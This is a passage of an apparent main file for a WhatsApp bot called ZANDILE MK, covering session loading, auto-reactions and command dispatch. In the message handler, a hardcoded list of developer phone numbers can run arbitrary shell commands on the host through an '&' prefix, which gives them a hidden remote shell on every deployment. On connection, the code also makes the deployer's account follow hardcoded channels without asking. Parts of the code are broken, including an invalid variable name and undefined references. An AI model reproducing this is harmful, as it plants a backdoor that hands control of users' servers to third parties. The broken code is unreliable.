// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});


// 𝗭𝗔𝗡𝗗𝗜𝗟𝗘 𝗠𝗞 CREATED BY 𝗝𝗢𝗦𝗛𝗨𝗔𝗠𝗔𝗠𝗕𝗢𝟭 𝗧𝗘𝗖𝗛 🤴 

const axios = require('axios')
const config = require('./settings')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require(config.BAILEYS)


const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const GroupEvents = require('./lib/groupevents');
  const { PresenceControl, BotActivityFilter } = require('./data/presence');
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const chalk = require('chalk');
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const { getPrefix } = require('./lib/prefix');

const ownerNumber = [263716985350] 

//=============================================
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
        fs.readdir(tempDir, (err, files) => {
            if (err) throw err;
            for (const file of files) {
                fs.unlink(path.join(tempDir, file), err => {
                    if (err) throw err;
                });
            }
        });
    }
    //=============================================
    // Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//=============================================

const express = require("express");
const app = express();
const port = process.env.PORT || 7860;



//=========SESSION-AUTH=====================

const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log(chalk.red('No SESSION_ID provided - QR login will be generated'));
            return null;
        }

        console.log(chalk.yellow('[ ⏳ ] Downloading creds data...'));
        console.log(chalk.cyan('[ 🆔️ ] Downloading MEGA.nz session...'));
        
        // Remove "malvin~" prefix if present, otherwise use full SESSION_ID
        const megaFileId = config.SESSION_ID.startsWith('ZANDILE-MK~') 
            ? config.SESSION_ID.replace("ZANDILE-MK~", "") 
            : config.SESSION_ID;

        const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
            
        const data = await new Promise((resolve, reject) => {
            filer.download((err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
        
        fs.writeFileSync(credsPath, data);
        console.log(chalk.green('[ ✅ ] MEGA session downloaded successfully'));
        return JSON.parse(data.toString());
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log(chalk.green('Will generate QR code instead'));
        return null;
    }
}

//=======SESSION-AUTH==============



async function connectToWA() {
    console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp ⏳️..."));

    // Load session if available (now handles both Koyeb and MEGA)
    const creds = await loadSession();

    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
        creds: creds || undefined // Pass loaded creds if available
    });

    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false, // Only show QR if no session loaded
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        getMessage: async() => ({})
    });

    // ... rest of your existing connectToWA code ...


    conn.ev.on('connection.update', async(update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'close') {
            if (lastDisconnect.error ?.output ?.statusCode !== DisconnectReason.loggedOut) {
                console.log(chalk.red('[ ⏳️ ] Connection lost, reconnecting...'));
                setTimeout(connectToWA, 5000);
            } else {
                console.log(chalk.red('[ 🛑 ] Connection closed, please change session ID'));
            }
        } else if (connection === 'open') {
        console.log('[ 🧩 ] Plugins installed successfully ✅');
            

            // Load plugins
            const pluginPath = path.join(__dirname, 'plugins');
            fs.readdirSync(pluginPath).forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() === ".js") {
                    require(path.join(pluginPath, plugin));
                }
            });
            
            console.log(chalk.green('[ 🤖 ] ZANDILE MK Connected ✅'));


            // Send connection message

            try {
                // const username = config.REPO.split('/').slice(3, 4)[0];
                const botname = "ᴢᴀɴᴅɪʟᴇ-ᴍᴋ"; //add your name
                const ownername = "ᴊᴏsʜᴜᴀᴍᴀᴍʙᴏ𝟭 ᴛᴇᴄʜ"; // add your name
                const ZANDILE-MK = {
                    key: {
                        remoteJid: 'status@broadcast',
                        participant: '0@s.whatsapp.net'
                    },
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '120363402507750390@newsletter', //add your channel jid
                            newsletterName: "👑ᴊᴏsʜᴜᴀᴍᴀᴍʙᴏ𝟭 ᴛᴇᴄʜ🥰🫡", //add your bot name
                            caption: botname + ` ʙʏ ` + ownername,
                            inviteExpiration: 0
                        }
                    }
                }


                const prefix = getPrefix();
                const username = `Joshuamambo1`;
                const mrJoshuamambo1 = `https://github.com/${username}`;

                const upMessage = `\`ᴢᴀɴᴅɪʟᴇ-ᴍᴋ ʙᴏᴛ  ᴄᴏɴɴᴇᴄᴛᴇᴅ!\` ✅
\n\n> _One of the Best W.A Bot._\n\n────────────────
> 🌟 \`Star Repo\` : 
${config.REPO}\n
> 🪄 \`Follow Us\` :
${mrmalvin}\n
> ⛔  \`Bot Prefix\` ${prefix}\n
> 📺 \`ʏᴏᴜᴛᴜʙᴇ ᴛᴜᴛᴏʀɪᴀʟꜱ\`:
https://youtube.com/@joshuamambo1
────────────────
\n> © ᴊᴏsʜᴜᴀᴍᴀᴍʙᴏ𝟭 ᴛᴇᴄʜ`;

               await conn.sendMessage(conn.user.id, { 
                        image: { url: `https://files.catbox.moe/dnjqau.jpg` },
			ai: true,
                        caption: upMessage
			
                    });
                
                /*
            //  DOESN'T SUPOORT IOS
            
              await conn.sendMessage(conn.user.id, {
                    image: { url: `https://files.catbox.moe/01f9y1.jpg` },
                    ai: true,
                    caption: upMessage
                }, {
                    quoted: malvin
                }); */

                // Send settings menu after connection message
                
            //================== C FOLLOW ==================

            // 📨 Newsletter channels to follow
const newsletterChannels = [
  "120363347365643318@newsletter", // Main Channel
  "120363347365643318@newsletter", // Secondary Channel
  "120363347365643318@newsletter"  // Tertiary Channel
];

// 🔁 Follow each newsletter and collect results
let followed = [];
let alreadyFollowing = [];
let failed = [];

for (const channelJid of newsletterChannels) {
  try {
    const metadata = await conn.newsletterMetadata("jid", channelJid);
    if (metadata.viewer_metadata === null) {
      await conn.newsletterFollow(channelJid);
      followed.push(channelJid);
    } else {
      alreadyFollowing.push(channelJid);
    }
  } catch (error) {
    failed.push(channelJid);
    console.error(`❌ Failed to follow ${channelJid}:`, error.message);
  }
}

// ✅ Summary log
let summary = `📡 Newsletter Follow Status:\n\n` +
              `✅ Followed: ${followed.length} channel(s)\n` +
              `📌 Already following: ${alreadyFollowing.length} channel(s)\n` +
              (failed.length > 0 ? `❌ Failed: ${failed.length} channel(s)\n\n` : `\n`) +
              `💡 Tip: Following these channels keeps your bot updated with the latest news and features.`;

console.log(chalk.cyan(summary.trim()));



            } catch (sendError) {
                console.error('[ 🔴 ] Error sending messages:', sendError);
            }
        }

        if (qr) {
            console.log(chalk.red('[ 🟢 ] Scan the QR code to connect or use session ID'));
        }
    });
    
   conn.ev.on('creds.update', saveCreds);




    // =====================================

    
            
// =====================================
	 conn.ev.on('messages.upsert', async (mek) => {
    try {
        mek = mek.messages[0];
        if (!mek.message) return;
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        // Mark message as read if enabled
        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
            console.log(chalk.cyan(`[ 📖 ] Marked message from ${mek.key.remoteJid} as read.`));
        }

        // Handle view-once messages
        if (mek.message.viewOnceMessageV2) {
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message 
                : mek.message;
        }

        // Auto-read status
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key]);
            console.log(chalk.cyan(`[ 📺 ] Auto-read status from ${mek.key.participant}.`));
        }

        // Auto-react for newsletters
        const newsletterJids = [
            "120363347365643318@newsletter",
            "120363347365643318@newsletter",
            "120363347365643318@newsletter"
        ];
        const emojis = ["❤️", "🔥", "😯"];
        if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
            try {
                const serverId = mek.newsletterServerId;
                if (serverId) {
                    const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
                    console.log(chalk.cyan(`[ 😺 ] Reacted to newsletter ${mek.key.remoteJid} with ${emoji}`));
                }
            } catch (e) {
                console.error(chalk.red(`[ ❌ ] Error reacting to newsletter: ${e.message}`));
            }
        }

        // Auto-react and reply to status
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
            const kingmalvin = await conn.decodeJid(conn.user.id);
            const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.sendMessage(mek.key.remoteJid, {
                react: { text: randomEmoji, key: mek.key }
            }, { statusJidList: [mek.key.participant, kingmalvin] });
            console.log(chalk.cyan(`[ 😺 ] Reacted to status from ${mek.key.participant} with ${randomEmoji}`));
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
            const user = mek.key.participant;
            const text = `${config.AUTO_STATUS_MSG}`;
            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
            console.log(chalk.cyan(`[ 📩 ] Replied to status from ${user} with message: ${text}`));
        }

        // Save message
        await Promise.all([saveMessage(mek)]);

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation : 
                    (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
                    (type == 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption : 
                    (type == 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption : '';
        const prefix = getPrefix();
        const isCmd = body.startsWith(prefix);
        const budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message.reactionMessage ? true : false;
        const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });

        // Banned users check
        const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
        const isBanned = bannedUsers.includes(sender);
        if (isBanned) {
            console.log(chalk.red(`[ 🚫 ] Ignored command from banned user: ${sender}`));
            return;
        }

        // Owner check
        const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

        // Mode restrictions
        if (!isRealOwner && config.MODE === "private") {
            console.log(chalk.red(`[ 🚫 ] Ignored command in private mode from ${sender}`));
            return;
        }
        if (!isRealOwner && isGroup && config.MODE === "inbox") {
            console.log(chalk.red(`[ 🚫 ] Ignored command in group ${groupName} from ${sender} in inbox mode`));
            return;
        }
        if (!isRealOwner && !isGroup && config.MODE === "groups") {
            console.log(chalk.red(`[ 🚫 ] Ignored command in private chat from ${sender} in groups mode`));
            return;
        }

        // Auto-react for all messages
        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = [
                '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
            ];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
            console.log(chalk.cyan(`[ 😺 ] Auto-reacted to message from ${sender} with ${randomReaction}`));
        }

        // Owner react
        if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
            const reactions = [
                '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', 
                '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', 
                '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', 
                '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', 
                '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', 
                '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', 
                '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', 
                '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', 
                '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', 
                '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', 
                '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', 
                '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', 
                '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', 
                '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', 
                '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', 
                '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', 
                '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', 
                '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', 
                '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', 
                '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', 
                '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', 
                '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', 
                '🍪', '🍩', '🍭', '🥮', '🍡'
            ];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
            console.log(chalk.cyan(`[ 😺 ] Owner auto-reacted to message with ${randomReaction}`));
        }

        // Custom react
        if (!isReact && config.CUSTOM_REACT === 'true') {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
            console.log(chalk.cyan(`[ 😺 ] Custom-reacted to message from ${sender} with ${randomReaction}`));
        }

        // Owner code execution with &
        const udp = botNumber.split('@')[0];
        const king = ['263716985350', '263738403205', '263777756184'];
        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
        let isCreator = [udp, ...king, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(sender);

        if (isCreator && mek.text.startsWith("&")) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                console.log(chalk.red(`[ ❌ ] No code provided for & command by ${sender}`));
                return;
            }
            const { spawn } = require("child_process");
            try {
                console.log(chalk.cyan(`[ 📡 ] Executing shell command: ${code} by ${sender}`));
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                    console.log(chalk.green(`[ ✅ ] Command output: ${data.toString()}`));
                });
                resultTest.stderr.on("data", data => {
                    reply(data.toString());
                    console.log(chalk.red(`[ ❌ ] Command error: ${data.toString()}`));
                });
                resultTest.on("error", data => {
                    reply(data.toString());
                    console.log(chalk.red(`[ ❌ ] Command execution failed: ${data.toString()}`));
                });
                resultTest.on("close", code => {
                    if (code !== 0) {
                        reply(`command exited with code ${code}`);
                        console.log(chalk.red(`[ ❌ ] Command exited with code ${code}`));
                    }
                });
            } catch (err) {
                reply(util.format(err));
                console.log(chalk.red(`[ ❌ ] Error executing & command: ${err.message}`));
            }
            return;
        }

        // Command execution with logging
        const events = require('./malvin');
        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
                       events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                // Log command detection
                console.log(chalk.cyan(
                    `[ 📡 ] Command Detected: ${prefix}${cmdName}\n` +
                    `├── Sender: ${pushname} (${sender})\n` +
                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                    `├── Args: ${args.join(' ') || 'None'}\n` +
                    `├── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}\n` +
                    `└── Status: Processing`
                ));

                // Apply command reaction if specified
                if (cmd.react) {
                    await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
                    console.log(chalk.cyan(`[ 😺 ] Applied command reaction: ${cmd.react} for ${prefix}${cmdName}`));
                }

                try {
                    // Execute command
                    await cmd.function(conn, mek, m, {
                        from, quoted, body, isCmd, command, args, q, text, 
                        isGroup, sender, senderNumber, botNumber2, botNumber, 
                        pushname, isMe, isOwner, isCreator, groupMetadata, 
                        groupName, participants, groupAdmins, isBotAdmins, 
                        isAdmins, reply
                    });
                    // Log successful execution
                    console.log(chalk.green(
                        `[ ✅ ] Command Executed: ${prefix}${cmdName}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                } catch (e) {
                    // Log error
                    console.error(chalk.red(
                        `[ ❌ ] Command Error: ${prefix}${cmdName}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `├── Error: ${e.message}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                    reply(`Error executing command: ${e.message}`);
                }
            } else {
                // Log unknown command
                console.log(chalk.yellow(
                    `[ ⚠️ ] Unknown Command: ${prefix}${cmdName}\n` +
                    `├── Sender: ${pushname} (${sender})\n` +
                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                ));
            }
        }

        // Handle non-command events
        events.commands.forEach(async (command) => {
            try {
                if (body && command.on === "body") {
                    console.log(chalk.cyan(
                        `[ 📡 ] Body Event Triggered: ${command.pattern || command.on}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                    await command.function(conn, mek, m, {
                        from, l, quoted, body, isCmd, command, args, q, text, 
                        isGroup, sender, senderNumber, botNumber2, botNumber, 
                        pushname, isMe, isOwner, isCreator, groupMetadata, 
                        groupName, participants, groupAdmins, isBotAdmins, 
                        isAdmins, reply
                    });
                } else if (mek.q && command.on === "text") {
                    console.log(chalk.cyan(
                        `[ 📡 ] Text Event Triggered: ${command.pattern || command.on}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                    await command.function(conn, mek, m, {
                        from, l, quoted, body, isCmd, command, args, q, text, 
                        isGroup, sender, senderNumber, botNumber2, botNumber, 
                        pushname, isMe, isOwner, isCreator, groupMetadata, 
                        groupName, participants, groupAdmins, isBotAdmins, 
                        isAdmins, reply
                    });
                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                    console.log(chalk.cyan(
                        `[ 📡 ] Image Event Triggered: ${command.pattern || command.on}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                    await command.function(conn, mek, m, {
                        from, l, quoted, body, isCmd, command, args, q, text, 
                        isGroup, sender, senderNumber, botNumber2, botNumber, 
                        pushname, isMe, isOwner, isCreator, groupMetadata, 
                        groupName, participants, groupAdmins, isBotAdmins, 
                        isAdmins, reply
                    });
                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                    console.log(chalk.cyan(
                        `[ 📡 ] Sticker Event Triggered: ${command.pattern || command.on}\n` +
                        `├── Sender: ${pushname} (${sender})\n` +
                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                    ));
                    await command.function(conn, mek, m, {
                        from, l, quoted, body, isCmd, command, args, q, text, 
                        isGroup, sender, senderNumber, botNumber2, botNumber, 
                        pushname, isMe, isOwner, isCreator, groupMetadata, 
                        groupName, participants, groupAdmins, isBotAdmins, 
                        isAdmins, reply
                    });
                }
            } catch (e) {
                console.error(chalk.red(
                    `[ ❌ ] Error in Event Handler: ${command.pattern || command.on}\n` +
                    `├── Sender: ${pushname} (${sender})\n` +
                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
                    `├── Error: ${e.message}\n` +
                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Gweru' })}`
                ));
            }
        });
    } catch (e) {
        console.error(chalk.red(`[ ❌ ] Error in messages.upsert: ${e.message}`));
    }
});
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
